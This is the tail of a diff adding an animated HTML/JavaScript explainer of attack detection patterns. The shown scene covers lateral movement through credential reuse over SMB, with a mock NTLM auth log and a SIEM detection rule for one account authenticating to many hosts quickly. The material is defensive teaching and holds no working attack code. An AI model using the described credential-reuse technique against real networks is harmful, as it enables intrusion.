+    <button class="btn" onclick="go(6)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ═══ SCENE 6: LATERAL MOVEMENT ═══ -->
+<div class="scene" id="s6" style="background:#001018">
+  <div class="hdr" style="background:#001018;border-bottom:1px solid #0d2838">
+    <div class="hdr-title" style="color:#4eff9a">PATTERN 5: LATERAL MOVE</div>
+    <div class="hdr-sub">SAME CRED → MANY HOSTS → FAST</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot done"></div>
+      <div class="dot done"></div><div class="dot done"></div><div class="dot active"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#001018">
+    <span class="slabel" style="color:#4eff9a">LATERAL MOVE</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">PIVOT</span>
+  </div>
+  <div class="anim" style="background:#001018">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- NETWORK MAP: pure SVG, single coordinate space
+           Node centres: SRC(55,95) | H1(183,32) H2(183,95) H3(183,158) | H4(311,32) H5(311,95) H6(311,158)
+      -->
+      <div style="height:190px;background:#000c12;border:2px solid #0d2838;border-radius:3px;overflow:hidden;position:relative">
+        <svg id="lm_svg" width="100%" height="190" viewBox="0 0 366 190" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <filter id="glow"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+
+          <!-- ── edges ── -->
+          <line id="lm_l1" x1="55" y1="95" x2="183" y2="32"  stroke="#0d2838" stroke-width="1.5"/>
+          <line id="lm_l2" x1="55" y1="95" x2="183" y2="95"  stroke="#0d2838" stroke-width="1.5"/>
+          <line id="lm_l3" x1="55" y1="95" x2="183" y2="158" stroke="#0d2838" stroke-width="1.5"/>
+          <line id="lm_l4" x1="183" y1="95" x2="311" y2="32"  stroke="#0d2838" stroke-width="1.5"/>
+          <line id="lm_l5" x1="183" y1="95" x2="311" y2="95"  stroke="#0d2838" stroke-width="1.5"/>
+          <line id="lm_l6" x1="183" y1="95" x2="311" y2="158" stroke="#0d2838" stroke-width="1.5"/>
+
+          <!-- ── ATTACKER node (55,95) ── -->
+          <g id="lm_src">
+            <circle cx="55" cy="95" r="18" fill="#0a001a" stroke="#2a1050" stroke-width="1.5"/>
+            <text x="55" y="100" text-anchor="middle" font-size="16">💀</text>
+            <text x="55" y="122" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">ATTACKER</text>
+          </g>
+
+          <!-- ── Tier-1 nodes ── -->
+          <g id="lm_h1">
+            <circle cx="183" cy="32" r="15" fill="#060e14" stroke="#0d2838" stroke-width="1.5"/>
+            <text x="183" y="37" text-anchor="middle" font-size="13">🖥️</text>
+            <text x="183" y="54" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">HOST-02</text>
+          </g>
+          <g id="lm_h2">
+            <circle cx="183" cy="95" r="15" fill="#060e14" stroke="#0d2838" stroke-width="1.5"/>
+            <text x="183" y="100" text-anchor="middle" font-size="13">🖥️</text>
+            <text x="183" y="117" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">HOST-07</text>
+          </g>
+          <g id="lm_h3">
+            <circle cx="183" cy="158" r="15" fill="#060e14" stroke="#0d2838" stroke-width="1.5"/>
+            <text x="183" y="163" text-anchor="middle" font-size="13">🖥️</text>
+            <text x="183" y="180" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">HOST-11</text>
+          </g>
+
+          <!-- ── Tier-2 nodes ── -->
+          <g id="lm_h4">
+            <circle cx="311" cy="32" r="15" fill="#060e14" stroke="#0d2838" stroke-width="1.5"/>
+            <text x="311" y="37" text-anchor="middle" font-size="13">🖥️</text>
+            <text x="311" y="54" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">HOST-14</text>
+          </g>
+          <g id="lm_h5">
+            <circle cx="311" cy="95" r="15" fill="#060e14" stroke="#0d2838" stroke-width="1.5"/>
+            <text x="311" y="100" text-anchor="middle" font-size="13">🖥️</text>
+            <text x="311" y="117" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">HOST-19</text>
+          </g>
+          <g id="lm_h6">
+            <circle cx="311" cy="158" r="15" fill="#060e14" stroke="#1a3010" stroke-width="1.5"/>
+            <text x="311" y="163" text-anchor="middle" font-size="13">💎</text>
+            <text x="311" y="180" text-anchor="middle" font-size="5.5" fill="#2a4030" font-family="'Press Start 2P',monospace">DC-01</text>
+          </g>
+
+          <!-- ── Animated credential dot ── -->
+          <circle id="lm_pkt" cx="55" cy="95" r="5" fill="#4eff9a" opacity="0" filter="url(#glow)"/>
+
+          <!-- ── Top label ── -->
+          <text id="lm_smblabel" x="183" y="14" text-anchor="middle" font-size="6" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">SAME CREDS USED EVERY HOP</text>
+
+          <!-- ── Timer ── -->
+          <text id="lm_timer" x="355" y="185" text-anchor="end" font-size="6" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">14 HOSTS / 90s</text>
+        </svg>
+      </div>
+
+      <!-- LOG PANEL -->
+      <div style="background:#000c12;border:1px solid #0d2838;border-radius:2px;padding:8px 10px">
+        <div style="font-size:6.5px;color:#4eff9a;margin-bottom:5px">SMB AUTH LOG</div>
+        <div style="display:flex;flex-direction:column;gap:2px">
+          <div id="lm_log1" style="font-size:6px;color:#555;opacity:0;transition:opacity .25s;line-height:1.8">✓ NTLM auth: admin → HOST-02 (445) T+0s</div>
+          <div id="lm_log2" style="font-size:6px;color:#555;opacity:0;transition:opacity .25s;line-height:1.8">✓ NTLM auth: admin → HOST-07 (445) T+6s</div>
+          <div id="lm_log3" style="font-size:6px;color:#555;opacity:0;transition:opacity .25s;line-height:1.8">✓ NTLM auth: admin → HOST-11 (445) T+11s</div>
+          <div id="lm_log4" style="font-size:6px;color:#e8a020;opacity:0;transition:opacity .25s;line-height:1.8">⚡ NTLM auth: admin → HOST-14 (445) T+17s</div>
+          <div id="lm_log5" style="font-size:6px;color:#e85050;opacity:0;transition:opacity .25s;line-height:1.8">🔴 ALERT: credential used 14 hosts in 90s</div>
+        </div>
+      </div>
+
+      <!-- DETECTION NOTE -->
+      <div class="panel" id="lm_detect" style="background:#000c12;border:1px solid #4eff9a;display:flex;align-items:center;gap:10px">
+        <div style="font-size:20px;flex-shrink:0">🔑</div>
+        <div>
+          <div style="font-size:7px;color:#4eff9a;margin-bottom:4px">SIEM RULE</div>
+          <div style="font-size:6.5px;color:#aaa;line-height:1.8">Same account auth to &gt;5 unique hosts within 60s via SMB (:445) or WinRM (:5985) = lateral movement alert.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info gn" style="margin:0 12px">
+    <div class="il">1 credential → 14 hosts → 90 seconds.</div>
+    <div class="ih">No human moves that fast. Only automation does.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">14</div><div class="sl">HOSTS/90s</div></div>
+    <div class="sc"><div class="sv am">:445</div><div class="sl">SMB PORT</div></div>
+    <div class="sc"><div class="sv rd">NTLM</div><div class="sl">CRED TYPE</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(5)">◀ PREV</button>
+    <button class="btn play" onclick="play(6)">▶ PLAY</button>
+    <button class="btn rd" onclick="go(1)">↩ RESTART</button>
+  </div>
+</div>
+
+<script>
+let cur=1,T=[];
+function clr(){T.forEach(t=>clearTimeout(t));T=[];}
+function af(ms,fn){T.push(setTimeout(fn,ms));}
+function show(id,ms){af(ms,()=>{const e=document.getElementById(id);if(e){e.style.opacity='1';e.classList.add('vis');}});}
+function hide(id){const e=document.getElementById(id);if(e){e.style.opacity='0';e.classList.remove('vis');}}
+function litNode(id,cls,ms){af(ms,()=>{const e=document.getElementById(id);if(!e)return;e.classList.remove('active','pulse','src','dst','peer');if(cls)e.classList.add(cls);});}
+function litEdge(id,color,ms){af(ms,()=>{const e=document.getElementById(id);if(!e)return;e.setAttribute('stroke',color);e.setAttribute('stroke-width',color==='#0d2838'?'1.5':'2.5');});}
+function moveDot(id,x1,y1,x2,y2,start,dur){
+  af(start,()=>{const d=document.getElementById(id);if(!d)return;d.style.transition='none';d.style.left=x1+'px';d.style.top=y1+'px';d.style.opacity='1';
+  af(30,()=>{d.style.transition=`left ${dur}ms linear,top ${dur}ms linear`;d.style.left=x2+'px';d.style.top=y2+'px';});});
+}
+function hideDot(id,ms){af(ms,()=>{const d=document.getElementById(id);if(d)d.style.opacity='0';});}
+
+function reset(n){
+  if(n===1){
+    ['h_a1','h_a2','h_a3','h_a4','h_a5','h_quote'].forEach(id=>hide(id));
+  }
+  if(n===2){
+    ['ps_b1','ps_b2','ps_b3','ps_b4','ps_b5','ps_b6','ps_b7'].forEach(id=>{
+      const e=document.getElementById(id);if(e)e.style.height='0';
+    });
+    hide('ps_alert');hide('ps_thresh');hide('ps_rule');hide('ps_types');
+  }
+  if(n===3){
+    ['dns_r0','dns_r1','dns_r2','dns_r3','dns_r4','dns_r5'].forEach(id=>hide(id));
+    hide('dns_alert');hide('dns_signals');
+  }
+  if(n===4){
+    const w=document.getElementById('bc_wave');
+    if(w)w.setAttribute('points','0,60 0,60');
+    hide('bc_alert');hide('bc_interval');hide('bc_why');
+  }
+  if(n===5){
+    const s=document.getElementById('ex_spike');if(s)s.style.height='0';
+    hide('ex_alert');hide('ex_thresh');hide('ex_flags');
+  }
+  if(n===6){
+    // reset SVG nodes — grey out circles
+    ['lm_src','lm_h1','lm_h2','lm_h3','lm_h4','lm_h5','lm_h6'].forEach(id=>{
+      const g=document.getElementById(id);
+      if(!g)return;
+      const c=g.querySelector('circle');
+      if(c){c.setAttribute('stroke','#0d2838');c.setAttribute('fill','#060e14');}
+      const t=g.querySelectorAll('text');
+      t.forEach(tx=>tx.setAttribute('fill',tx.getAttribute('font-size')==='5.5'?'#2a4030':''));
+    });
+    ['lm_l1','lm_l2','lm_l3','lm_l4','lm_l5','lm_l6'].forEach(id=>litEdge(id,'#0d2838',0));
+    const dp=document.getElementById('lm_pkt');
+    if(dp){dp.setAttribute('opacity','0');dp.setAttribute('cx','55');dp.setAttribute('cy','95');}
+    const sl=document.getElementById('lm_smblabel');if(sl)sl.setAttribute('opacity','0');
+    const tm=document.getElementById('lm_timer');if(tm)tm.setAttribute('opacity','0');
+    ['lm_log1','lm_log2','lm_log3','lm_log4','lm_log5','lm_detect'].forEach(id=>hide(id));
+  }
+}
+
+// Beacon waveform points builder
+function buildBeaconPoints(){
+  const pts=[];
+  const W=320,H=80,base=55;
+  // flat segments with spike at regular intervals
+  const spikes=[40,104,168,232,296];
+  for(let x=0;x<=W;x+=2){
+    let y=base;
+    for(const s of spikes){
+      if(x>=s-2&&x<s){y=base-(((x-(s-2))/2)*30);}
+      else if(x>=s&&x<s+2){y=base-30+(((x-s)/2)*30);}
+    }
+    pts.push(`${x},${y}`);
+  }
+  return pts.join(' ');
+}
+
+function animateBeacon(){
+  const wave=document.getElementById('bc_wave');
+  if(!wave)return;
+  const pts=buildBeaconPoints().split(' ');
+  let i=0;
+  function step(){
+    if(i>=pts.length)return;
+    const chunk=pts.slice(0,i+4).join(' ');
+    wave.setAttribute('points',chunk);
+    i+=4;
+    if(i<pts.length)af(20,step);
+  }
+  step();
+}
+
+function play(n){
+  clr();reset(n);
+  if(n===1){
+    ['h_a1','h_a2','h_a3','h_a4','h_a5'].forEach((id,i)=>show(id,300+i*400));
+    show('h_quote',2400);
+  }
+  if(n===2){
+    show('ps_thresh',400);
+    af(600,()=>{
+      ['ps_b1','ps_b2','ps_b3','ps_b4','ps_b5','ps_b6','ps_b7'].forEach((id,i)=>{
+        const e=document.getElementById(id);
+        const heights=['52px','65px','82px','88px','90px','75px','48px'];
+        if(e)e.style.height=heights[i];
+      });
+    });
+    show('ps_alert',1200);
+    show('ps_rule',1600);
+    show('ps_types',2200);
+  }
+  if(n===3){
+    show('dns_r0',300);show('dns_r1',700);
+    show('dns_r2',1100);show('dns_r3',1500);show('dns_r4',1900);
+    show('dns_alert',1900);
+    show('dns_r5',2300);
+    show('dns_signals',2700);
+  }
+  if(n===4){
+    af(300,()=>animateBeacon());
+    show('bc_alert',2200);
+    show('bc_interval',2400);
+    show('bc_why',2700);
+  }
+  if(n===5){
+    show('ex_thresh',400);
+    af(800,()=>{const s=document.getElementById('ex_spike');if(s)s.style.height='87px';});
+    show('ex_alert',1400);
+    show('ex_flags',1800);
+  }
+  if(n===6){
+    // SVG helpers
+    function svgShow(id,ms){af(ms,()=>{const e=document.getElementById(id);if(e)e.setAttribute('opacity','1');});}
+    function litSVGNode(id,color,ms){
+      af(ms,()=>{
+        const g=document.getElementById(id);if(!g)return;
+        const c=g.querySelector('circle');
+        if(c){c.setAttribute('stroke',color);c.setAttribute('fill',color==='#e85050'?'#1a0008':color==='#4eff9a'?'#001a08':'#060e14');}
+      });
+    }
+    function moveSVGDot(x1,y1,x2,y2,startMs,durMs){
+      af(startMs,()=>{
+        const d=document.getElementById('lm_pkt');if(!d)return;
+        d.setAttribute('cx',x1);d.setAttribute('cy',y1);d.setAttribute('opacity','1');
+        const frames=Math.round(durMs/16);
+        let f=0;
+        function step(){
+          f++;const p=f/frames;
+          d.setAttribute('cx', x1+(x2-x1)*p );
+          d.setAttribute('cy', y1+(y2-y1)*p );
+          if(f<frames)af(16,step);else d.setAttribute('opacity','0');
+        }
+        af(16,step);
+      });
+    }
+
+    // Activate attacker
+    litSVGNode('lm_src','#e85050',300);
+    svgShow('lm_smblabel',400);
+
+    // Wave 1: attacker → tier-1
+    litEdge('lm_l1','#4eff9a',600);
+    moveSVGDot(55,95,183,32,620,450);
+    litSVGNode('lm_h1','#4eff9a',1080);show('lm_log1',1080);
+
+    litEdge('lm_l2','#4eff9a',1200);
+    moveSVGDot(55,95,183,95,1220,450);
+    litSVGNode('lm_h2','#4eff9a',1680);show('lm_log2',1680);
+
+    litEdge('lm_l3','#4eff9a',1800);
+    moveSVGDot(55,95,183,158,1820,450);
+    litSVGNode('lm_h3','#4eff9a',2280);show('lm_log3',2280);
+
+    // Wave 2: tier-1 hub → tier-2
+    litEdge('lm_l4','#4eff9a',2450);
+    moveSVGDot(183,95,311,32,2470,400);
+    litSVGNode('lm_h4','#4eff9a',2880);show('lm_log4',2880);
+
+    litEdge('lm_l5','#4eff9a',3000);
+    moveSVGDot(183,95,311,95,3020,400);
+    litSVGNode('lm_h5','#4eff9a',3430);
+
+    // DC final — red
+    litEdge('lm_l6','#e85050',3550);
+    moveSVGDot(183,95,311,158,3570,450);
+    litSVGNode('lm_h6','#e85050',4030);
+    show('lm_log5',3300);
+    svgShow('lm_timer',3400);
+    show('lm_detect',4200);
+  }
+}
+
+function go(n){
+  clr();
+  document.getElementById('s'+cur).classList.remove('active');
+  cur=n;
+  document.getElementById('s'+n).classList.add('active');
+  reset(n);
+  af(80,()=>play(n));
+}
+
+window.addEventListener('load',()=>{af(150,()=>play(1));});
+</script>
+</body>
+</html>
